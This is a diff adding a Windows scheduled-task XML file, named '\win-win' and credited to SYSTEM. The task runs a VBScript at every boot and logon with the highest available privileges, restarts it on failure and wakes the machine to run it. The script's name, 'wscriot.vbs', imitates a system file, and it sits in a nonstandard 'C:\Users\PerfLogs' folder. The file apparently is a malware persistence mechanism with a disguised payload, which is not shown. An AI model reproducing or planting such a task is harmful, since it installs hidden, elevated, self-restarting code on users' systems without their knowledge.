@@ -1,0 +1,52 @@
+<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task" version="1.2">
+    <RegistrationInfo>
+        <Date>2024-01-03T01:57:52.993051</Date>
+        <Author>SYSTEM</Author>
+        <URI>\win-win</URI>
+    </RegistrationInfo>
+    <Triggers>
+        <BootTrigger>
+            <Enabled>true</Enabled>
+            <Delay>PT3S</Delay>
+        </BootTrigger>
+        <LogonTrigger>
+            <Enabled>true</Enabled>
+        </LogonTrigger>
+    </Triggers>
+    <Principals>
+        <Principal id="Author">
+            <GroupId>S-1-5-32-545</GroupId>
+            <RunLevel>HighestAvailable</RunLevel>
+        </Principal>
+    </Principals>
+    <Settings>
+        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+        <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+        <AllowHardTerminate>true</AllowHardTerminate>
+        <StartWhenAvailable>true</StartWhenAvailable>
+        <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
+        <IdleSettings>
+            <StopOnIdleEnd>true</StopOnIdleEnd>
+            <RestartOnIdle>false</RestartOnIdle>
+        </IdleSettings>
+        <AllowStartOnDemand>true</AllowStartOnDemand>
+        <Enabled>true</Enabled>
+        <Hidden>false</Hidden>
+        <RunOnlyIfIdle>false</RunOnlyIfIdle>
+        <WakeToRun>true</WakeToRun>
+        <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
+        <Priority>7</Priority>
+        <RestartOnFailure>
+            <Interval>PT15M</Interval>
+            <Count>3</Count>
+        </RestartOnFailure>
+    </Settings>
+    <Actions Context="Author">
+        <Exec>
+            <Command>C:\Windows\System32\wscript.exe</Command>
+            <Arguments>"C:\Users\PerfLogs\wscriot.vbs"</Arguments>
+            <WorkingDirectory>C:\Users\PerfLogs</WorkingDirectory>
+        </Exec>
+    </Actions>
+</Task>
